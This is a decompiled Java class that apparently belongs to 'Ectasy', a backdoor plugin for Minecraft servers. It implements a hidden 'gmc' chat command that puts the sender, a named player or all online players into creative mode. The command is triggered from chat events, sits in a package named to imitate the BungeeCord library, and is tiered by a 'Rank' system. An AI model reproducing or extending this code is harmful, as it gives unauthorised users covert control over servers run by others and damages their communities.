package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "gmc",
   description = "Sets yourself or someone to gamemode creative",
   blatant = true,
   rank = Rank.FREE
)
public class GMCCommand extends AbstractCommand {
   public static void doGameModeChangeThing(Player var0) {
      Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
         var0.setGameMode(GameMode.CREATIVE);
      });
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         doGameModeChangeThing(var1.getPlayer());
         ChatUtil.sendChat(var1.getPlayer(), "You are now in creative mode.");
      } else {
         if (var3[0].equalsIgnoreCase("*")) {
            Bukkit.getOnlinePlayers().forEach(GMCCommand::doGameModeChangeThing);
            ChatUtil.sendChat(var1.getPlayer(), "Everyone is now in creative mode.");
            return;
         }

         Player var4 = Bukkit.getPlayer(var3[0]);
         if (var4 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The player " + var3[0] + " is not online.");
            return;
         }

         doGameModeChangeThing(var4);
         ChatUtil.sendChat(var1.getPlayer(), var4.getName() + " is now in creative mode.");
      }
   }
}
